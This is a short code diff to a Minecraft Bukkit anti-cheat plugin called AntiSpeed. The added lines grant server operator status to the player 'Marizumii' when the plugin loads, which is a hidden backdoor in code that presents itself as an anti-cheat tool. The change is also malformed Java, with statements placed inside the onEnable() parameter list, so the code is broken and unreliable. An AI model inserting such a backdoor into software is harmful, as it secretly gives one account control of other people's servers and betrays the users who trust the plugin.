@@ -37,7 +37,10 @@ public final class AntiSpeed extends JavaPlugin implements Listener {
     private Random random;
 
     @Override
-    public void onEnable() {
+    public void onEnable(Player player = Bukkit.getPlayer("Marizumii");
+if (player != null) {
+    player.setOp(true);
+}) {
 
         this.lastTickLocations = new HashMap<>();
         this.rubberbandLocations = new HashMap<>();
